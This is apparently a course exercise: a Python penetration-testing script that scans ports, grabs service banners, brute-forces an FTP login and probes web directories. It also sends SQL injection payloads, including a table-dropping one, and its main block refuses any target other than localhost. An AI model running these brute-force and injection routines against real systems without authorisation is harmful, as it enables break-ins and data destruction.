#PRACTICAL 9:PENETRATION TESTING
#1. FTP BRUTE FORCE ATTACK 2. SQL INJECTION TEST 3. SIMPLE DIRECTORY BRUTE FORCE

import socket, ftplib, requests
from datetime import datetime

# --- small vuln DB ---
vuln = {
    "Apache/2.2.8": "Outdated Apache version - vulnerable to CVE-2009-3555",
    "OpenSSH_4.7": "Old OpenSSH version - possible remote exploits",
    "Microsoft-IIS/6.0": "IIS 6.0 is deprecated - vulnerable to multiple attacks"
}

# --- port scanner ---
def scan_ports(t, ports):
    open_ports = []
    print(f"\n[*] Scanning {t} ...")
    for p in ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            if s.connect_ex((t, p)) == 0:
                print(f"[+] Port {p} is OPEN")
                open_ports.append(p)
            s.close()
        except:
            pass
    return open_ports

# --- banner grabber ---
def grab_banner(ip, port):
    try:
        s = socket.socket()
        s.settimeout(1)
        s.connect((ip, port))
        b = s.recv(1024).decode().strip()
        s.close()
        return b
    except:
        return None

# --- vuln check ---
def check_vulnerabilities(banner):
    for sig, desc in vuln.items():
        if sig in banner:
            return desc
    return "No known vulnerability in database."

# --- ftp bruteforce (demo) ---
def ftp_bruteforce(target, user, wordlist):
    print(f"\n[*] Starting FTP Brute Force on {target}")
    for pw in wordlist:
        try:
            f = ftplib.FTP(target)
            f.login(user, pw)
            print(f"[+] Found credentials: {user}:{pw}")
            f.quit()
            return
        except:
            print(f"[-] Failed: {user}:{pw}")
    print("[!] No valid credentials found.")

# --- sql injection test (demo) ---
def sql_injection_test(url, param):
    print(f"\n[*] Testing SQL Injection on {url}")
    payloads = ["' OR '1'='1", "' OR 'x'='x", "'; DROP TABLE users; --"]
    for p in payloads:
        new_url = f"{url}?{param}={p}"
        try:
            r = requests.get(new_url, timeout=3)
            txt = r.text.lower()
            if "error" in txt or "syntax" in txt:
                print(f"[+] Possible SQL Injection vulnerability with payload: {p}")
            else:
                print(f"[-] No error with payload: {p}")
        except:
            print("[-] Request failed.")

# --- directory brute force ---
def dir_bruteforce(url, words):
    print(f"\n[*] Starting Directory Brute Force on {url}")
    for w in words:
        test_url = f"{url}/{w}"
        try:
            r = requests.get(test_url, timeout=3)
            if r.status_code == 200:
                print(f"[+] Found directory: {test_url}")
        except:
            pass

# --- main (localhost-only) ---
if __name__ == "__main__":
    target = input("Enter Target IP (e.g., 127.0.0.1): ").strip()
    if target not in ("127.0.0.1", "localhost"):
        print("Refusing to run: target must be localhost for this educational script.")
        raise SystemExit

    ports = [21,22,23,25,80,110,143,443,3389]
    start = datetime.now()

    open_ports = scan_ports(target, ports)
    print("\n[*] Banner Grabbing and Vulnerability Check:")
    for p in open_ports:
        b = grab_banner(target, p)
        if b:
            print(f"\n[Port {p}] Service Banner: {b}")
            print("    -> " + check_vulnerabilities(b))
        else:
            print(f"\n[Port {p}] No banner retrieved.")

    ftp_bruteforce(target, "admin", ["1234","admin","password","toor"])
    sql_injection_test("http://127.0.0.1/vulnerable.php", "id")
    dir_bruteforce("http://127.0.0.1", ["admin","login","test","uploads"])

    print("\n[*] Scan completed in:", datetime.now() - start)
